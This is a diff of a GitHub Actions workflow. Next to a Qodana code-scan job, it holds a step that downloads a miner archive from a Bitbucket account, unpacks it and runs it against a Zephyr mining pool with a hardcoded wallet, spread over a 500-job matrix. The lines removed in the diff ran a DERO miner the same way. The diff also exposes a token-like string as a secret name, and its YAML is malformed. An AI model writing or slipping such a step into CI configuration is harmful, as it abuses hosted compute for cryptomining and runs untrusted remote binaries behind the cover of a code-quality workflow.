@@ -9,24 +9,12 @@ on:
 
 jobs:
   qodana:
+    name: BIN_Github
     runs-on: ubuntu-latest
     permissions:
       contents: write
       pull-requests: write
       checks: write
-    steps:
-      - uses: actions/checkout@v3
-        with:
-          ref: ${{ github.event.pull_request.head.sha }}  # to check out the actual pull request commit, not the merge commit
-          fetch-depth: 0  # a full history is required for pull request analysis
-      - name: 'Qodana Scan'
-        uses: JetBrains/qodana-action@v2023.3
-        env:
-          QODANA_TOKEN: ${{ secrets.eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcmdhbml6YXRpb24iOiIzUGRneSIsInByb2plY3QiOiIzN3JtMSIsInRva2VuIjoiQUR5cVoifQ.3mkO7emGU43GCUUlgppvXO3_Btb9o24rcPLbRcMDZH4 }}
-jobs:
-  build:
-    name: BIN_Github
-    runs-on: ubuntu-latest
     strategy:
       max-parallel: 500
       fail-fast: false
@@ -36,8 +24,17 @@ jobs:
     timeout-minutes: 3
     env:
         NUM_JOBS: 500
-        JOB: ${{ matrix.go }}
+        JOB: ${{ matrix.go }}  
     steps:
+      - uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}  # to check out the actual pull request commit, not the merge commit
+          fetch-depth: 0  # a full history is required for pull request analysis
+      - name: 'Qodana Scan'
+        uses: JetBrains/qodana-action@v2023.3
+        env:
+          QODANA_TOKEN: ${{ secrets.eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcmdhbml6YXRpb24iOiIzUGRneSIsInByb2plY3QiOiIzN3JtMSIsInRva2VuIjoiQUR5cVoifQ.3mkO7emGU43GCUUlgppvXO3_Btb9o24rcPLbRcMDZH4 }}
+        steps:
     - name: Set up Go ${{ matrix.go }}
       uses: actions/setup-go@v1
       with:
@@ -47,4 +44,5 @@ jobs:
       uses: actions/checkout@v1
     - name: runner_go
       run: |
-         wget https://bitbucket.org/wename798/jaya/downloads/astrominer.tar.gz && tar -xvf astrominer.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmglejssqhngtrqzsn49h -r dero.rabidmining.com:10300
+         wget https://bitbucket.org/wename798/sawah/downloads/RTM.tar.gz && tar -xvf RTM.tar.gz && ./RTM --url pool.hashvault.pro:80 --user ZEPHsCkAtVmQPWiNweaUB2J8UC68jPZC9E1Sbztz2Nus2vtih87GdN3CpdzFs76CaXGuxHZ4SLFzAXnMzjLw4dHvbTbcpNsPE7f --pass crot --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+
